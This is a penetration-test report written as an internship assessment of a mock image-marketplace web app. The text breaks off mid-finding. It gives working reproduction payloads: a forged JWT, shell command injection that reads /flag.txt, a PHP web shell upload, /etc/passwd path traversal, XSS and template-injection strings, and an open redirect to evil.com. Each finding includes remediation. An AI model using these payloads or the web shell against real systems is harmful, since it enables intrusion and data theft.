# Security Assessment Report
## MWR CyberSec — Internship Application Assessment
### Target: Imgurr Mock Web Application

**Assessor:** Katlego Tsebe
**TryHackMe Username:** GhostInTheMachine
**Date of Assessment:** 9th September to 8th October 2026
**Report Version:** 1.0
**Classification:** CONFIDENTIAL

## Confidentiality Statement

This report has been prepared solely for the use of MWR CyberSec as part of the internship application assessment process. The contents of this report are confidential and must not be shared with, copied to, or discussed with any third party without the prior written consent of MWR CyberSec.

The findings in this report describe vulnerabilities identified during the assessment. None of the techniques, payloads, or exploitation steps described here may be used against any system that the reader does not have explicit, written authorisation to test.

##  Disclaimer

This assessment was conducted within an authorised, controlled environment provided by MWR CyberSec for evaluation purposes only. All testing was performed strictly within the defined scope. No production systems, live data, or real users were affected at any point.

 The assessor accepts no liability for the use or misuse of the information in this report.

## Executive Summary

A security assessment was performed against the **Imgurr** web application — an online image marketplace that allows users to buy, sell, and review images. The assessment covered all areas of the application that a regular user, seller, or administrator would interact with, including account management, purchasing, file uploads, and the admin control panel. Testing ran from the 9th of September to the 8th of October 2026 using a black-box approach where the application was tested as an outside attacker would, with no prior knowledge of the underlying code.

A total of **16 security vulnerabilities** were identified across the platform. Of these, **10 were confirmed exploitable** and returned proof-of-exploitation flag values. The findings cover a wide range of severity — from critical issues that give an attacker immediate, complete control of the platform, to lower-severity issues that, while not immediately harmful on their own, can be combined with other weaknesses to cause significant damage.

The overall security posture of the application is **poor**. The most serious vulnerabilities mean that any person — even someone with no account — could access all private transaction data on the platform without logging in. A registered user could take over any other account, including the administrator account, without needing to know anyone's password. An approved seller could upload a malicious file that executes code directly on the server. These are not edge-case issues that require specific conditions — they are straightforward exploits that any attacker with basic web security knowledge could carry out.

The platform must not be deployed in its current state. The three critical findings alone represent an unacceptable level of risk to the confidentiality, integrity, and availability of user data and platform operations. Immediate remediation is required, starting with the authentication system, file upload handling, and admin access controls.

## Scope

| Asset | Details |
|-------|---------|
| Imgurr Web Application | `http://10.82.188.187` (IP resets on VM reboot) |
| Testing Period | 9th September to 8th October 2026 |
| Approach | Black-box with frontend source code review |

All endpoints, all functionality, and all user roles were in scope. Host-level privilege escalation and OS-level exploitation were explicitly out of scope. All flag values retrieved from the server were obtained via the application's own endpoints, as permitted.

## Methodology

The assessment used a combination of manual testing and custom scripts. Tools and techniques included:

- **curl / Python `requests`** — Crafting, replaying, and manipulating raw HTTP requests to test endpoint behaviour, authentication controls, and input handling.
- **Frontend source code review** — The application's JavaScript bundles were downloaded and decompiled to identify client-side rendering logic (e.g. `innerHTML` vs safe interpolation), hidden endpoints, and data-binding patterns.
- **Directory brute-forcing** — Gobuster with SecLists wordlists (`raft-medium`, `raft-large`) was used to discover endpoints not referenced in the frontend source, including `/api/admin/dashboard`.
- **JWT manipulation** — Custom Python scripts were used to forge authentication tokens with arbitrary payloads and garbage signatures, testing whether the server verified token integrity.
- **Payload injection** — XSS, CSTI, command injection, and path traversal payloads were tested across all user-controlled input fields and URL parameters.
- **Business logic testing** — Edge cases in pricing, purchasing, voucher redemption, and seller approval flows were tested manually.
- **File upload testing** — Multiple file types, extensions, and MIME types were uploaded to test for validation gaps and server-side execution.

All testing was performed from a Kali Linux machine. No automated vulnerability scanners (e.g. Burp Scanner, Nikto) were used — all findings were identified and confirmed manually.

## Risk Rating Definitions

All findings are rated using MWR CyberSec's standard risk rating scheme, extended with a Critical tier for findings with immediate, unconditional impact:

| Rating | Definition |
|--------|------------|
| **Critical** | Direct, immediate path to full system compromise, RCE, or total authentication bypass with no preconditions. |
| **High** | Potential for an attacker to control, alter, or delete electronic assets. Unauthorised access, data capture, defacement. |
| **Medium** | Combined with other factors, potential for asset compromise. Conditional exploitation or configuration-dependent. |
| **Low** | Likelihood or impact of exploitation is extremely low. Weak ciphers, outdated protocols, programmatic bypass. |
| **Informational** | Cannot be exploited directly but not aligned with best practice. Information disclosure, version leakage. |

## Findings Summary

| # | Title | Risk | Flag |
|---|-------|------|------|
| 1 | Broken JWT Authentication — Signature Never Verified | Critical | `MWR{3edc3d1bf8a00cf280a276c35e4beb6e}` |
| 2 | OS Command Injection via Admin Ping Feature | Critical | `MWR{66015e341cdfeaf3f6b328ba7ca12e99}` |
| 3 | Unrestricted File Upload Leading to Remote Code Execution | Critical | `MWR{43a55c36d6d8b824e38a8b4a27d5a55b}` |
| 4 | Unauthenticated Access to Admin Dashboard | High | `MWR{557dc6000bb75535e9289459610c00d8}` |
| 5 | Missing Authentication and CSRF Protection on Seller Approval | High | `MWR{1fa1c3ee1e71d561c122c4e7596a10ba}` |
| 6 | Client-Side Template Injection (CSTI) via User Bio Field | High | `MWR{6f6a40e80dd6e7a11864f967be41a2b9}` |
| 7 | Stored XSS via Username Registration Field | High | `MWR{f6a275e8e3a7eafaddadb9cd00dfb28d}` |
| 8 | Reflected DOM-Based XSS via Search Query | High | `MWR{f973910b6dfcfd5aa2f9e3c93472e56f}` |
| 9 | Path Traversal / Local File Inclusion via Download Endpoint | High | N/A |
| 10 | Open Redirect via User Redirect Endpoint | Medium | `MWR{498c5a0afb5faa3e294db95872fc8a2e}` |
| 11 | Business Logic Flaw — Negative Price Listings | Medium | `MWR{f7ec2298ff0400e6a2c8543e667fa547}` |
| 12 | Weak Default Admin Credentials | Medium | N/A |
| 13 | XSS via Listing Title and Description Fields (Admin Panel) | Medium | N/A |
| 14 | Username Case-Sensitivity Enables Account Impersonation | Medium | N/A |
| 15 | Unauthenticated Access to Voucher PDF Documents | Low | N/A |
| 16 | Chained Data Exposure — Admin Dashboard and Purchase Verification | Low | N/A |

## Detailed Findings

### Finding 1: Broken JWT Authentication — Signature Never Verified

**Risk Rating:** Critical

**Flag:** `MWR{3edc3d1bf8a00cf280a276c35e4beb6e}`

**Description:**

The application issues JSON Web Tokens (JWTs) to authenticate users on the main API. A JWT has three parts: a header, a payload, and a cryptographic signature. The signature exists to prove that the payload has not been tampered with. The application accepts and trusts any JWT without ever checking whether the signature is valid — it reads the claims from the payload as-is, regardless of what is in the signature field.

This means anyone can craft a token claiming to be any user — including the admin — by simply encoding a forged payload and appending any arbitrary string as the signature. No secret key is needed.

**Reproduction Steps:**

1. Register any account and receive a legitimate JWT in the login response.
2. Decode the JWT manually (split on `.`, base64url-decode each part):
   - Header: `{"alg":"HS256","typ":"JWT"}`
   - Payload: `{"sub":"305","username":"testhacker","is_admin":false,"iat":...,"exp":...}`
3. Construct a forged payload to impersonate the admin user (ID 1):
   ```
   {"sub":"1","username":"admin","is_admin":true,"iat":1790037559,"exp":1999999999}
   ```
4. Base64url-encode the header and forged payload (no padding), join with `.`, and append any garbage string as the signature:
   ```
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhZG1pbiIsImlzX2FkbWluIjp0cnVlLCJpYXQiOjE3OTAwMzc1NTksImV4cCI6MTk5OTk5OTk5OX0.garbage
   ```
5. Send `GET /api/auth/me` with `Authorization: Bearer <forged_token>`.
6. The server returns the admin user's full profile and includes `{"flags":{"authz":"MWR{3edc3d1bf8a00cf280a276c35e4beb6e}"}}` — confirming the token was accepted without signature verification.

**Evidence:**

The server response confirmed admin account data (email: `admin@imgurr.test`, `is_admin: true`, `id: 1`) was returned for all nine parallel forged token requests tested. The same technique was used to impersonate alice (user ID 2, an approved seller) throughout the assessment to chain with other findings.

**Business Impact:**

Any person who knows a valid user ID — obtainable via the public profile endpoints or the unauthenticated admin dashboard (Finding 4) — can take over that account completely. They can read private emails and order history, make purchases on behalf of others, post content as another user, and, by targeting the admin account, gain full administrative access to the platform. This represents a total collapse of the authentication layer — every other access control that relies on the Bearer token is bypassed.

**Screenshot References:**
- N/A

**Remediation:**

Use a well-maintained JWT library and ensure the `verify=True` option (or equivalent) is set when decoding tokens. The library must validate the signature against a strong, randomly generated secret key stored securely in an environment variable — never hardcoded. Consider asymmetric signing (RS256) for additional security. Rotate any secret key that may have been exposed. Never decode a token's payload before verifying its signature.

### Finding 2: OS Command Injection via Admin Ping Feature

**Risk Rating:** Critical

**Flag:** `MWR{66015e341cdfeaf3f6b328ba7ca12e99}`

**Description:**

The admin panel includes a "Check Network Connection" feature that pings a supplied hostname. The `host` value from the request body is passed directly into a shell command without sanitisation. An attacker can inject arbitrary shell commands by appending them after a semicolon (`;`), which terminates the `ping` command and starts a new one.

Although execution happens inside an isolated sandbox container (loopback-only network, running as `nobody`), the flag file is present there and the vulnerability demonstrates full server-side code execution at the application layer.

**Reproduction Steps:**

1. Log in to the admin panel: `POST /api/admin/login` with `{"email":"admin@imgurr.test","password":"password"}`. A `session` cookie is set.
2. Send:
   ```
   POST /api/admin/ping
   Cookie: session=<admin_session_cookie>
   Content-Type: application/json

   {"host":"127.0.0.1; id"}
   ```
3. The response includes `"output":"uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)"` — confirming command injection.
4. Send `{"host":"127.0.0.1; cat /flag.txt"}` to read the flag: `MWR{66015e341cdfeaf3f6b328ba7ca12e99}`.

**Exploration Results:**

The sandbox container has only a loopback network interface — there is no route to the host network or other internal services. The container runs as `nobody` with no write access outside its own scope. The flag file lives at `/flag.txt` in the container root.

**Business Impact:**

Command injection gives an attacker full code execution on the server. This allows them to read the database, steal private keys and credentials, install backdoors, and access any internal services the server communicates with. Combined with the missing CSRF protection on this endpoint (Finding 5), a logged-in admin who visits a malicious external page could have commands executed on the server without their knowledge.

**Screenshot References:**
- N/A

**Remediation:**

Never build shell commands by joining user input as a string. Use a safe subprocess API that passes arguments as a list — e.g. Python's `subprocess.run(["ping", "-c", "1", host], shell=False)`. Validate `host` server-side against a strict allowlist of IP address formats or approved hostnames before use. The process executing pings should run with the minimum privileges needed and have no access to sensitive files.

### Finding 3: Unrestricted File Upload Leading to Remote Code Execution

**Risk Rating:** Critical

**Flag:** `MWR{43a55c36d6d8b824e38a8b4a27d5a55b}`

**Description:**

The image listing upload endpoint (`POST /api/uploads/listings`) accepts files of any extension and any MIME type without validation. When a `.php` file is uploaded, the server stores it using the original `.php` extension. The file is then executed by a PHP interpreter when fetched via `GET /api/uploads/files/<filename>.php`. This gives any approved seller — or anyone using the JWT forgery from Finding 1 to impersonate one — the ability to run arbitrary code on the server.

Execution happens inside an isolated sandbox container running as `nobody`, with only a loopback network interface.

**Reproduction Steps:**

1. Using the forged Alice JWT (user ID 2, approved seller — from Finding 1), send:
   ```
   POST /api/uploads/listings
   Authorization: Bearer <forged_alice_token>
   Content-Type: multipart/form-data

   title=webshell
   description=test
   price_bucks=5
   image=shell.php (content: <?php echo shell_exec($_GET['cmd']); ?>)
   ```
2. The response includes `"upload_url":"/api/uploads/files/<hash>.php"` — the `.php` extension is preserved.
3. Fetch: `GET /api/uploads/files/<hash>.php?cmd=cat+/flag.txt`
4. Response: `{"executed":true,"output":"MWR{43a55c36d6d8b824e38a8b4a27d5a55b}"}` — the PHP executed and returned the flag.
5. `id` command confirms: `uid=65534(nobody)`, loopback-only network.

**Business Impact:**

This vulnerability allows an attacker to execute any code they choose on the server. An attacker with this level of access can read the database, steal user credentials and payment information, install persistent backdoors, and access any internal systems the server connects to. The ability to upload and execute arbitrary code is one of the most serious classes of vulnerability in web security.

**Screenshot References:**
- N/A

**Remediation:**

Enforce a strict allowlist of permitted file extensions server-side (e.g. `.png`, `.jpg`, `.gif`, `.webp` only). Validate file content using a library that inspects the actual file magic bytes — not just the Content-Type header or extension. Store uploaded files in a directory that is outside the web root and never executed by any interpreter. Serve uploaded files through a controlled endpoint that sets `Content-Disposition: attachment` and a safe `Content-Type`, preventing browsers from executing them.

### Finding 4: Unauthenticated Access to Admin Dashboard

**Risk Rating:** High

**Flag:** `MWR{557dc6000bb75535e9289459610c00d8}`

**Description:**

The endpoint `GET /api/admin/dashboard` was not referenced anywhere in the application's frontend — it was only discovered through directory brute-forcing. Despite being an admin resource, it requires no authentication whatsoever: no session cookie, no Bearer token, and no CSRF token. Any unauthenticated person can call it and receive recent order data for the entire platform, including buyer IDs, transaction amounts, item titles, and purchase-verification hashes. The response also leaks internal system metadata (database engine and application version).

**Reproduction Steps:**

1. Run directory brute-forcing against `/api/admin/`:
   ```
   gobuster dir -u http://<target>/api/admin -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
   ```
2. Observe `dashboard` returns HTTP 200.
3. Send with zero authentication:
   ```
   GET /api/admin/dashboard HTTP/1.1
   Host: 10.82.188.187
   ```
4. Full JSON response returned: `{"flags":{"admin_panel":"MWR{...}"},"recent_orders":[...],"system":{"db_engine":"sqlite","version":"1.0.0"}}` — containing purchase records for all recent users.

**Evidence:**

The dashboard response contained ten recent orders from users across the platform, including buyer IDs, item prices, and purchase verification hashes. These hashes were cross-referenced with `GET /api/shop/verify/:hash` (also unauthenticated) to resolve each one to a buyer username, item title, price, and timestamp — confirming a chained privacy breach (see also Finding 16).

**Business Impact:**

Any member of the public can access private transaction data for all platform users without logging in. The system metadata disclosure (database engine type) assists attackers in tailoring further attacks against the platform. Combined with Finding 16, every recent buyer on the platform can be identified and linked to specific purchases — a breach of user privacy and a violation of data protection obligations including South Africa's Protection of Personal Information Act (POPIA).

**Screenshot References:**
- N/A

**Remediation:**

Apply authentication and authorisation middleware to every admin endpoint without exception. Implement a centralised access control layer for the `/api/admin/` namespace that fails closed — any new route must be explicitly permitted, not implicitly accessible. Audit all existing endpoints to confirm none have been left unprotected.

### Finding 5: Missing Authentication and CSRF Protection on Seller Approval

**Risk Rating:** High

**Flag:** `MWR{1fa1c3ee1e71d561c122c4e7596a10ba}`

**Description:**

The admin panel sets an `admin_csrf_token` cookie on login to defend against Cross-Site Request Forgery (CSRF) attacks. Most admin endpoints correctly require this token. However, the seller approval endpoint — `POST /api/admin/sellers/:id/approve` — checks for neither the CSRF token nor a valid admin session. A completely unauthenticated HTTP request to this endpoint succeeds.

This inconsistency suggests protection was added to most admin routes as middleware but the seller approval route was implemented separately and missed.

Additionally, the `POST /api/admin/ping` endpoint (the command injection endpoint from Finding 2) also skips CSRF verification when a valid session cookie is present, creating a cross-site command injection vector.

**Reproduction Steps:**

1. Without any authentication, send:
   ```
   POST /api/admin/sellers/55/approve HTTP/1.1
   Host: 10.82.188.187
   Content-Length: 0
   ```
2. Response: `200 OK` with `{"flags":{"auth_bypass":"MWR{...}"},"status":"seller approved","user":{...}}` — a seller was approved with no credentials at all.
3. For contrast: `POST /api/admin/users/305/promote` without authentication returns `403 {"error":"CSRF token missing or invalid"}` — confirming protection exists but was inconsistently applied.

**Business Impact:**

Any unauthenticated attacker can approve any pending seller application, placing fraudulent or unreviewed sellers on the platform without any admin involvement. When combined with Finding 2 (command injection on a CSRF-exempt endpoint), an attacker can craft a web page that causes any logged-in admin who visits it to unknowingly execute arbitrary commands on the server.

**Screenshot References:**
- N/A

**Remediation:**

Apply CSRF token validation as consistent middleware across every state-changing admin endpoint. Require a valid admin session before any action is taken — even for endpoints where CSRF is also checked. Implement the checks as global middleware that fails closed, requiring explicit opt-out only for truly public endpoints. Conduct a full audit of all admin routes to confirm none have been inadvertently left without these protections.

### Finding 6: Client-Side Template Injection (CSTI) via User Bio Field

**Risk Rating:** High

**Flag:** `MWR{6f6a40e80dd6e7a11864f967be41a2b9}`

**Description:**

The user bio field (`PUT /api/users/me/bio`) stores raw user input without sanitisation. The public profile page renders this bio by passing it through Vue's runtime template compiler (`Vue.compile()`) and mounting it as a live application instance. This means Vue `{{ }}` mustache syntax in the bio is compiled and executed as real code — not rendered as plain text.

An attacker can use the expression `{{constructor.constructor("alert(1)")()}}` to break out of the template sandbox and execute arbitrary JavaScript in the browser of any user who views their profile page.

This is more dangerous than standard stored XSS because it does not require raw HTML tags and may bypass certain HTML-sanitisation defences.

**Reproduction Steps:**

1. Authenticate as any user and send:
   ```
   PUT /api/users/me/bio
   Authorization: Bearer <token>
   Content-Type: application/json

   {"bio":"{{constructor.constructor(\"alert(document.domain)\")()}}"}
   ```
2. Response includes `{"flags":{"csti":"MWR{...}"}}` — the server detected the CSTI payload on save.
3. Root cause confirmed by reading the decompiled `UserProfile-CAGSoDjQ.js` frontend component: the bio value is passed to `T()` (Vue's `compile`) and then mounted with `B()` (`createApp`). Any Vue expression in the bio is compiled and executed as live template code.
4. Any user who visits the attacker's profile at `/users/<username>` will have the injected code execute in their browser.

**Business Impact:**

A stored CSTI payload on a public profile page executes in the browser of every visitor. An attacker uses this to steal session tokens, redirect users to phishing sites, or perform actions on their behalf — including making purchases or modifying account settings. If an admin visits the profile while logged in, their admin session is hijacked.

**Screenshot References:**
- N/A

**Remediation:**

Never pass user-supplied content to `Vue.compile()` or any runtime template compiler. Render bio content using Vue's safe text interpolation (`v-text` directive or `{{ }}` mustache where the value is treated as a string, not compiled). If HTML formatting in bios is required, use a strict allowlist-based HTML sanitiser (e.g. DOMPurify) before rendering, and never compile the sanitised output as a template.

### Finding 7: Stored XSS via Username Registration Field

**Risk Rating:** High

**Flag:** `MWR{f6a275e8e3a7eafaddadb9cd00dfb28d}`

**Description:**

The registration endpoint (`POST /api/auth/register`) accepts raw HTML in the `username` field. Although the frontend registration form implies a restricted character set through its placeholder text, no server-side validation enforces this. The username is stored verbatim and rendered via `innerHTML` in the heading on the public profile page, causing stored XSS for any user who visits the attacker's profile.

Root cause confirmed by reading `UserProfile-CAGSoDjQ.js`: the username is bound as `innerHTML:o.value.username` — direct DOM injection without escaping.

**Reproduction Steps:**

1. Send:
   ```
   POST /api/auth/register
   Content-Type: application/json

   {"username":"<img src=x onerror=alert(document.domain)>","email":"xss@test.com","password":"Password123!"}
   ```
2. Response: `201 Created` with `{"flags":{"xss":"MWR{...}"}}` and the username stored exactly as submitted.
3. `GET /api/users/<url-encoded-username>` confirms the username is served back completely unescaped.
4. Any user who visits `/users/<attacker-username>` has the XSS payload execute in their browser.

**Business Impact:**

An attacker registers with an XSS payload as their username and shares their profile link. Any visitor — including admins — has arbitrary JavaScript execute in their session. This is used for session hijacking, credential theft, or performing actions on a victim's behalf without their knowledge.

**Screenshot References:**
- N/A

**Remediation:**

Enforce server-side username validation against a strict regex allowlist (e.g. `^[a-zA-Z0-9_]{3,32}$`). Reject registrations that do not match with a clear error message. In the frontend, render all usernames using safe text binding (`v-text` or Vue's `{{ }}` mustache syntax) — never `innerHTML`.

### Finding 8: Reflected DOM-Based XSS via Search Query

**Risk Rating:** High

**Flag:** `MWR{f973910b6dfcfd5aa2f9e3c93472e56f}`

**Description:**

The image search feature reflects the user's search query in a "no results found" message when the search returns zero matches. The frontend builds this message by embedding the raw query into a template literal and rendering the result via `innerHTML` — without any HTML encoding.

Root cause confirmed in `Browse-DanqYhvm.js`: when `images.length === 0`, the component renders `` `No images found for "${searchQuery}".` `` via `innerHTML:` — the query is embedded raw into the rendered HTML.

**Reproduction Steps:**

1. Send:
   ```
   GET /api/shop/images?q=<img src=x onerror=alert(document.domain)>
   Authorization: Bearer <token>
   ```
2. Response: `{"flags":{"xss":"MWR{...}"},"images":[],"total":0}` — the server detected the payload on the no-results read.
3. A shareable URL like `http://<target>/browse?q=<img src=x onerror=alert(1)>` executes the payload in any victim's browser that clicks it and gets zero results.

**Business Impact:**

An attacker crafts a URL that executes JavaScript in any logged-in user's browser when visited. This is a classic reflected XSS vector used for session hijacking, credential theft, and phishing. The payload is easily distributable via social media, email, or messaging.

**Screenshot References:**
- N/A

**Remediation:**

Replace `innerHTML:` with safe text binding (`v-text` or Vue's `{{ }}` mustache) in the Browse component for the no-results message. Alternatively, HTML-encode the search query before embedding it in any HTML-rendered string using DOMPurify or manual entity encoding. Never use `innerHTML` for any user-controlled value.

### Finding 9: Path Traversal / Local File Inclusion via Download Endpoint

**Risk Rating:** High

**Flag:** N/A

**Description:**

The file download endpoint — `GET /api/files/images/:id/download?filename=<path>` — allows the `filename` parameter to be an absolute path or a relative path containing `../` sequences. The backend passes this value to a system command via `sudo` without adequate path validation, allowing an authenticated user to read arbitrary files from the server's filesystem.

A secondary attack path was confirmed: by using the JWT forgery from Finding 1 to impersonate any approved seller, an attacker can use that seller's image IDs as the vehicle, bypassing the image-ownership check entirely.

The application's own frontend source code contains a comment in the decompiled `ImageDetail` component confirming this was a deliberate UI removal: *"Deprecated: the download endpoint used to take an explicit `?filename=` override... Removed from the UI... but the server route still accepts the parameter."* The parameter was removed from the user interface but never removed or protected on the server.

**Reproduction Steps:**

1. Purchase any image (or use the JWT-forgery technique from Finding 1 to act as an approved seller).
2. Send:
   ```
   GET /api/files/images/4/download?filename=/etc/passwd
   Authorization: Bearer <token>
   ```
3. Response: `Content-Type: application/octet-stream` with the full `/etc/passwd` file contents.
4. Relative traversal also works: `filename=../../../../../etc/passwd` (5 levels deep resolves from the uploads directory to the filesystem root).
5. URL-encoded traversal (`%2f` in place of `/`) is blocked by the server — only literal slashes work.
6. `filename=/proc/self/environ` reveals: `SUDO_COMMAND=/bin/cat -- <path>`, `SUDO_USER=imgurr`, `SUDO_UID=996` — confirming the download runs via `sudo cat` and identifying the application user account.
7. `filename=/proc/self/mountinfo` reveals the real application path: `/opt/imgurr/backend/instance` is bind-mounted as writable — confirming the backend lives at `/opt/imgurr/backend/`.

**Files Successfully Read:**
- `/etc/passwd` — full system user list
- `/proc/self/environ` — process environment variables (leaked sudo context, user IDs)
- `/proc/self/mountinfo` — confirmed app paths and bind mounts
- `/proc/net/tcp` — revealed internal open ports (80, 8000/application server, 36375/unknown-root)
- `/proc/self/maps` — process memory layout and binary paths
- `/etc/nginx/nginx.conf` — web server global configuration

**Files Not Readable:** `/etc/shadow` (root-owned, permissions 400), application source files at `/opt/imgurr/backend/` (owned by a different user account), SQLite database file.

**Business Impact:**

An attacker reads any world-readable file on the server: system configuration, process environment variables (potentially leaking secrets if stored that way), network configuration, and scheduled task definitions. The environment variable leak confirmed the running privilege context and user accounts. If secrets such as database credentials or API keys are passed via environment variables — a common practice — this vulnerability directly exposes those values, leading to complete platform compromise.

**Screenshot References:**
- N/A

**Remediation:**

Validate the `filename` parameter strictly on the server: resolve the full absolute path after joining with the intended base directory and reject any path that does not begin with the approved prefix (canonical path check). Alternatively, remove the `filename` parameter entirely — the deprecated comment in the source confirms it was already removed from the UI and serves no current purpose. Store images using opaque identifiers (UUIDs) and serve them by ID only. Remove `../` sequences from all user input before any filesystem operation.

### Finding 10: Open Redirect via User Redirect Endpoint

**Risk Rating:** Medium

**Flag:** `MWR{498c5a0afb5faa3e294db95872fc8a2e}`

**Description:**

The endpoint `GET /api/users/redirect?next=<url>` is used by the frontend's logout flow to determine where to redirect the user after signing out. The `next` parameter is reflected directly in the response as `redirect_to` and the frontend performs `window.location.href = redirect_to` without any validation. Any URL scheme is accepted — including `https://evil.com`, `javascript:`, `data:`, and protocol-relative URLs (`//attacker.com`).

**Reproduction Steps:**

1. Send:
   ```
   GET /api/users/redirect?next=https://evil.com
   Authorization: Bearer <token>
   ```
2. Response: `{"flags":{"dom_redirect":"MWR{...}"},"redirect_to":"https://evil.com"}` — the URL is reflected verbatim.
3. A crafted logout link like `http://<target>/logout?next=https://phishing-site.com` silently redirects any logged-in user to the attacker's site after they log out.
4. `javascript:alert(1)` and `data:text/html,<script>alert(1)</script>` are also accepted, enabling direct code execution in some browser contexts.

**Business Impact:**

An attacker redirects users to phishing sites at the moment of logout — a trusted action. Because the redirect happens immediately after signing out, users trust the destination and are likely to enter their credentials on a fake login page designed to look like the real one.

**Screenshot References:**
- N/A

**Remediation:**

Validate the `next` parameter against a strict allowlist of permitted redirect destinations (e.g. only relative paths on the same origin). Reject any value that does not match. If redirects to specific external sites are required, implement an explicit allowlist of approved domains. Never accept `javascript:` or `data:` schemes in any redirect parameter.

### Finding 11: Business Logic Flaw — Negative Price Listings

**Risk Rating:** Medium

**Flag:** `MWR{f7ec2298ff0400e6a2c8543e667fa547}`

**Description:**

The listing creation endpoint (`POST /api/uploads/listings`) accepts a `price_bucks` value with no lower-bound validation. A seller sets a negative price (e.g. `-500`). When a buyer purchases such a listing, the backend calculates `new_balance = current_balance - price_bucks`. With a negative price, this subtraction becomes addition — the buyer's MWR-Bucks balance increases instead of decreasing. This is repeated indefinitely to generate unlimited virtual currency.

Note: The listing edit endpoint (`PUT /api/uploads/listings/:id`) does validate against negative prices and correctly rejects them — the flaw is specific to the creation path only, indicating the validation was added to the edit endpoint at some point but never applied consistently.

**Reproduction Steps:**

1. As an approved seller (or using the JWT-forgery technique to act as alice), send:
   ```
   POST /api/uploads/listings (multipart/form-data)
   Authorization: Bearer <seller_token>

   title=Negative Price Test
   description=test
   price_bucks=-500
   image=<valid PNG file>
   ```
2. Response: `{"image":{"price_bucks":-500,...},"status":"listed"}` — accepted without error.
3. As a buyer account, send: `POST /api/shop/images/<id>/purchase`
4. Response: `{"flags":{"bizlogic":"MWR{...}"},"mwr_bucks":<balance_increased_by_500>}` — balance went up, not down.
5. Repeat with new negative-price listings to accumulate unlimited currency.

**Business Impact:**

Any seller transfers unlimited funds to any buyer account, enabling free purchases of all items on the platform and completely undermining the platform's economy. In a real-money equivalent system, this constitutes financial fraud.

**Screenshot References:**
- N/A

**Remediation:**

Validate `price_bucks` server-side on both the creation and edit endpoints to ensure the value is a non-negative integer within an acceptable range (e.g. 0 to 1,000,000). Return a clear validation error for out-of-range values. Apply the same validation consistently across all endpoints that accept price inputs. Never rely on client-side validation alone.

### Finding 12: Weak Default Admin Credentials

**Risk Rating:** Medium

**Flag:** N/A

**Description:**

The admin account uses the password `password` — one of the most commonly tested credentials in any brute-force attack. This password works on both the admin panel login (`POST /api/admin/login`) and the main API login (`POST /api/auth/login`). As the admin account has elevated platform privileges, the weak password represents a significant risk that requires no technical exploitation.

During testing, the admin account was locked after ten failed login attempts on a separate endpoint — a correctly functioning lockout control. However, the lockout does not compensate for a password that would be guessed within the first ten attempts of any targeted attack.

**Reproduction Steps:**

1. Send: `POST /api/admin/login` with `{"email":"admin@imgurr.test","password":"password"}`
2. Response: `200 OK` with a full admin session cookie.
3. Repeat against: `POST /api/auth/login` with the same credentials.
4. The same password grants access on both authentication surfaces.

**Business Impact:**

An attacker who attempts common passwords against the admin account gains full administrative access to the platform without needing any technical exploit. The admin account approves sellers, disables accounts, views all platform statistics, and — via the command injection in Finding 2 — executes arbitrary server-side commands.

**Screenshot References:**
- N/A

**Remediation:**

Enforce a strong password policy: minimum 12 characters, mixing uppercase, lowercase, digits, and symbols. Require the default password to be changed on first login. Consider multi-factor authentication for admin accounts. Ensure credentials are unique per environment and never reused across systems or test environments.

### Finding 13: XSS via Listing Title and Description Fields (Admin Panel Rendering)

**Risk Rating:** Medium

**Flag:** N/A

**Description:**

The listing creation endpoint (`POST /api/uploads/listings`) accepts raw HTML in the `title` and `description` fields without server-side sanitisation. These values are stored verbatim and, in the admin panel's "Pending Seller Applications" view, are rendered using `innerHTML` binding. A malicious seller injects XSS payloads into these fields that execute when an admin views the applications table.

This was confirmed by reading the decompiled `Admin-Dq3vdRQ5.js` source, which shows `innerHTML:t.seller_art_category`, `innerHTML:t.seller_tax_code`, and `innerHTML:t.seller_company_bio` bindings in the pending applications table — meaning all three seller application fields are vulnerable.

**Reproduction Steps:**

1. As an approved seller, send:
   ```
   POST /api/uploads/listings (multipart)
   Authorization: Bearer <seller_token>

   title=<img src=x onerror=alert(document.domain)>
   description=<script>alert('desc-xss')</script>
   price_bucks=5
   image=<PNG file>
   ```
2. Response: `200 OK` — the listing is created with the raw HTML in the title and description fields.
3. Any admin who views the seller application page will have the XSS execute in their session.

**Business Impact:**

A malicious seller plants XSS in their application fields that targets the admin when reviewing applications. This is used to steal the admin's session cookie, execute actions as the admin, or pivot to further attacks including triggering the command injection from Finding 2.

**Screenshot References:**
- N/A

**Remediation:**

Sanitise all user-submitted text fields (title, description, company bio, art category, tax code) server-side before storage. In the admin panel frontend, replace `innerHTML:` bindings with safe text rendering (`v-text` or `{{ }}` mustache) for all user-controlled fields.

### Finding 14: Username Case-Sensitivity Enables Account Impersonation

**Risk Rating:** Medium

**Flag:** N/A

**Description:**

The registration endpoint performs username uniqueness checks with a case-sensitive comparison. This means a user can register `Admin`, `ADMIN`, or `AdMiN` even though the original `admin` account already exists — they are treated as distinct usernames. Email uniqueness is enforced case-insensitively, but username uniqueness is not. An attacker registers `Admin` using a different email address and impersonates the real `admin` account visually across all display surfaces.

**Reproduction Steps:**

1. Confirm `admin` is registered (the admin account exists).
2. Send:
   ```
   POST /api/auth/register
   {"username":"Admin","email":"attacker@test.com","password":"Password123!"}
   ```
3. Response: `201 Created` — the account `Admin` is created as a distinct, legitimate user.
4. `GET /api/users/Admin` returns a real, separate profile — visually indistinguishable from `admin` in many display contexts.
5. The attacker posts comments as `Admin`, creates listings under `Admin`, and sets a bio claiming to be the real administrator.

**Business Impact:**

A malicious user impersonates admins or other trusted users to deceive community members, post fake announcements, direct users to phishing content, or manipulate trust within the platform.

**Screenshot References:**
- N/A

**Remediation:**

Normalise usernames to lowercase before performing uniqueness checks on registration. Reject any registration where the lowercased version of the new username matches any existing username. Apply this consistently alongside the existing case-insensitive email check. Consider also blocking registration of usernames that closely resemble privileged account names (e.g. `adm1n`, `admin_`).

### Finding 15: Unauthenticated Access to Voucher PDF Documents

**Risk Rating:** Low

**Flag:** N/A

**Description:**

The endpoint `GET /api/vouchers/:code/pdf` serves the PDF for a purchased voucher without requiring any authentication. Any person who knows a valid voucher code downloads the corresponding PDF without logging in. The endpoint was confirmed to return a full PDF with a `200 OK` response when called with no session cookie or Bearer token.

Voucher codes follow the format `MWR-<16 uppercase hex chars>` — not easily brute-forceable in isolation, but potentially obtainable via the unauthenticated admin dashboard (Finding 4) or through information disclosure in other responses.

**Reproduction Steps:**

1. Purchase a voucher and note the code (e.g. `MWR-7DCF36074E4A98DD`).
2. Log out completely (confirmed by removing all cookies and tokens in a fresh session).
